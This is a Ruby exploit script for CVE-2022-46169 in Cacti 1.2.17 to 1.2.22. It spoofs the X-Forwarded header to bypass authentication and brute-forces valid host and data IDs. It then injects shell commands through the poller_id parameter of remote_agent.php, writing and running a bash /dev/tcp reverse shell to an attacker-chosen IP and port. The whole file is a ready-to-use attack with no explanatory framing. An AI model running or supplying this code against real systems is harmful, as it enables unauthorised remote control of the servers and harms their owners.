#!/usr/bin/ruby
#
# CVE-2022-46169 | Cacti Unauthenticated Command Execution Exploit in Ruby 
# Coded By Habib | LinkedIn @habib0x
# Date           | 16/01/2023 - 3:48 AM
#

require 'net/http'
require 'uri'
require 'json'
require 'optparse'
require 'artii'
require 'colorize'


a = Artii::Base.new(font = 'big')
puts a.asciify('Cacti 1.2.17-22 RCE').colorize(:red)
print " By @Habib0x\n\n".colorize(:red)

options = {}
OptionParser.new do |opts|
  opts.banner = "Usage: 46169.rb [options]"

  opts.on("-u", "--url URL", "Victim URL") do |url|
    options[:url] = url
  end
  opts.on("-f", "--forwarded FORWARDED", "X-Forwarded value to bypass the auth") do |forwarded|
    options[:forwarded] = forwarded
  end
  opts.on("-i", "--ip IP", "IP for reverse shell") do |ip|
    options[:ip] = ip
  end
  opts.on("-p", "--port PORT", "Port for reverse shell") do |port|
    options[:port] = port
  end
end.parse!

headers = {'X-Forwarded': options[:forwarded]}
url = URI.parse("#{options[:url]}/remote_agent.php?action=polldata&poller_id=1&host_id=1&local_data_ids[]=7")
req = Net::HTTP::Get.new(url, headers)

res = Net::HTTP.start(url.hostname, url.port) {|http|
  http.request(req)
}


# Authentication Bypass - X-Forwarded
uri = URI(url)
req = Net::HTTP::Get.new(uri, headers)
puts "[+] Attempting to bypass auth...".colorize(:green)
res = Net::HTTP.start(uri.hostname, uri.port) {|http|
    http.request(req)
}
if res.body != "FATAL: You are not authorized to use this service"
    puts "[+] Authentication Bypassed!".colorize(:green)
else
    puts "[+] Authentication Bypass Failed.".colorize(:red)
    puts "[+] Not vulnerable or X-Forwarded value was wrong.".colorize(:red)
    exit
end


# initialize variables to store found values
host_id = nil
local_data_id = nil

# Brute Force 
puts "[+] Bruteforcing host_id and local_data_ids[]".colorize(:green)
    #this will bruteforce the host_id and local_data_ids[] to find some valid value and save to initialized variables above
    (1..10).each do |i|
        (1..10).each do |f|
            brute_url = "#{options[:url]}/remote_agent.php?action=polldata&&local_data_ids[]=#{f}&host_id=#{i}&poller_id=1"
            uri = URI(brute_url)
            req = Net::HTTP::Get.new(uri, headers)
            res = Net::HTTP.start(uri.hostname, uri.port) {|http|
                http.request(req)
            }
            if res.body != "[]"
                if res.body.include?("value")
                    puts "[+] Found valid host_id: #{i}".colorize(:green)
                    puts "[+] Found valid local_data_ids[]: #{f}".colorize(:green)
                    # store found values in variables
                    host_id = i
                    local_data_id = f
                    puts "[+] Sending reverse shell...".colorize(:green)
                    break                
                end
            end
        end
    end


# Reverse shell payload
reverse_shell = ";echo%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F#{options[:ip]}%2F#{options[:port]}%200%3E%261%22%20%3E%20rev.sh"

# URL of the remote_agent.php script
rce_url = "#{options[:url]}/remote_agent.php?action=polldata&poller_id=#{reverse_shell}&host_id=#{host_id}&local_data_ids[]=#{local_data_id}"

# Send a GET request to the injected URL
uri = URI(rce_url)
req = Net::HTTP::Get.new(uri, headers)
res = Net::HTTP.start(uri.hostname, uri.port) {|http|
    http.request(req)
}
url = "#{options[:url]}/remote_agent.php?action=polldata&poller_id=;bash%20rev.sh&host_id=#{host_id}&local_data_ids[]=#{local_data_id}"
uri = URI(url)
req = Net::HTTP::Get.new(uri, headers)
res = Net::HTTP.start(uri.hostname, uri.port) {|http|
    http.request(req)
}
